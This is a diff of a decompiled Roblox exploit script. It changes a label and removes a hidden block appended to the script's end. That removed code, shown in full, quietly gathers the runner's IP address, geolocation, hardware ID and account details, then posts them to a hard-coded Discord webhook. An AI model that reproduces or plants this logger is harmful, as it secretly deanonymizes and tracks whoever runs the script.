@@ -714,7 +714,7 @@ task.spawn(function()
     local v229 = Instance.new("TextLabel")
     v229.Size = UDim2.new(1, 0, 0, 25)
     v229.BackgroundTransparency = 1
-    v229.Text = "m0_3a DC"
+    v229.Text = "sozuaa DC"
     v229.Font = Enum.Font.FredokaOne
     v229.TextSize = 20
     v229.TextColor3 = Color3.fromRGB(240, 240, 255)
@@ -1798,56 +1798,4 @@ task.spawn(function()
         end
     end)
 end)
-wait(1.5)
-local vu420 = game:GetService("HttpService")
-local v421 = game:GetService("Players")
-local v422 = game:GetService("MarketplaceService")
-local v423 = v421.LocalPlayer
-local vu424 = v423.UserId
-local vu425 = v423.DisplayName
-local vu426 = v423.Name
-local vu427 = tostring(v423.MembershipType):sub(21)
-local vu428 = v423.AccountAge
-local vu429 = game.LocalizationService.RobloxLocaleId
-local vu430 = game:HttpGet("https://v4.ident.me/")
-local vu431 = game:HttpGet("http://ip-api.com/json")
-local vu432 = game:GetService("RbxAnalyticsService"):GetClientId()
-local vu433 = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")"
-local vu434 = v422:GetProductInfo(game.PlaceId).Name
-local function vu435()
-    return syn and not is_sirhurt_closure and (not pebc_execute and "Synapse X") or (secure_load and "Sentinel" or pebc_execute and "ProtoSmasher" or (KRNL_LOADED and "Krnl" or is_sirhurt_closure and "SirHurt")) or (identifyexecutor():find("ScriptWare") and "Script-Ware" or "Unsupported")
-end;
-(function(p436, p437)
-    (http_request or request or (HttpPost or syn.request))({
-        Url = p436,
-        Body = p437,
-        Method = "POST",
-        Headers = {
-            ["content-type"] = "application/json"
-        }
-    })
-end)("https://discord.com/api/webhooks/1452545240819962111/5CaE-Coqr3XKzmyhkQolIYtAO6ziUXTfjIp7_wP3Lt1rh5-ioZu_aYgeaVBT2_JCCTxz", ((function()
-    local v438 = vu435()
-    local v439 = {
-        avatar_url = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
-        content = "@everyone you\'re script has been executed"
-    }
-    local v440 = {}
-    local v441 = {
-        author = {
-            name = "Someone executed your script",
-            url = "https://roblox.com"
-        },
-        description = string.format("__[Player Info](https://www.roblox.com/users/%d)__ **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s\n\n**Data:**```%s```\n\n**JobId:**```%s```", vu424, vu425, vu426, vu424, vu427, vu428, vu429, vu430, vu432, tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")), game.PlaceId, vu434, game.PlaceId, v438, vu431, vu433),
-        type = "rich",
-        color = tonumber("0xFFD700"),
-        thumbnail = {
-            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. vu424 .. "&width=150&height=150&format=png"
-        }
-    }
-    __set_list(v440, 1, {
-        v441
-    })
-    v439.embeds = v440
-    return vu420:JSONEncode(v439)
-end)()))
+
